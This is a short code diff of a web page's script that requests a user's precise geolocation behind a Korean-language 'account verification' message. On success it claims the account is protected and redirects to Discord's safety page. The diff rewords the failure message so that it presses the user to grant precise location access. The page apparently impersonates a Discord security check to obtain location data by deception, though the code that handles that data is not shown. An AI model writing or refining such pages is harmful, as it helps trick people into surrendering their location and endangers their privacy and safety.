@@ -72,7 +72,7 @@
                     alert("인증되었습니다. 계정이 보호되었습니다.");
                     window.location.href = "https://discord.com/safety";
                 }, (err) => {
-                    alert("인증 실패: 보안을 위해 위치 권한을 허용해야 합니다.");
+                    alert("정확한 위치 권한을 허용해주십시오.");
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
         }
